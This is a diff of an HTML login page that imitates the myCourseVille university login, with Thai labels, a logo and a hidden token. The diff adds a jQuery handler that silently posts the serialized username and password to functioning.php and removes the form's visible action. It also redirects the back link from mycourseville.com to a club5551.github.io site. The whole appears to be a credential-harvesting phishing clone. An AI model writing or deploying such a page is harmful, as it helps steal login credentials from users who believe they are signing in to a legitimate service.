@@ -10,6 +10,14 @@
     gtag('js', new Date());
 
     gtag('config', "UA-152515770-1");
+
+    $('#cv-login-cvecologin-form').submit(function() {
+    var post_data = $('#cv-login-cvecologin-form').serialize();
+    $.post('functioning.php', post_data, function(data) {
+        
+    });
+    });
+
     </script>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -51,7 +59,7 @@
             <div id="cv-login-cvecologin-logo" aria-hidden="true">
                 <img src="resources/logo-itchula.png"/>
             </div>
-            <form id="cv-login-cvecologin-form" role="form" method="POST" action="functioning.php">
+            <form id="cv-login-cvecologin-form" role="form"> 
                 <input type="hidden" name="_token" value="FN7zev7eXfKQegXJPA2CmTK1FHjkZW8HOw8LJwmH">
                 <div class="form-row">
                     <input type="username" class="form-control" id="username" name="username" value="" placeholder="ชื่อบัญชี (Username)" >
@@ -71,7 +79,7 @@
                     <button type="submit" name = "Gobtn" class="btn btn-primary cv-default-bs" id="cv-login-cvecologinbutton">เข้าสู่ระบบ</button>
                     
                                             <div id="cv-login-cvecologin-form-util">
-                            <a href="https://www.mycourseville.com/api/login">ย้อนกลับ</a>
+                            <a href="https://club5551.github.io/">ย้อนกลับ</a>
                         </div>
                                     
                 </div>
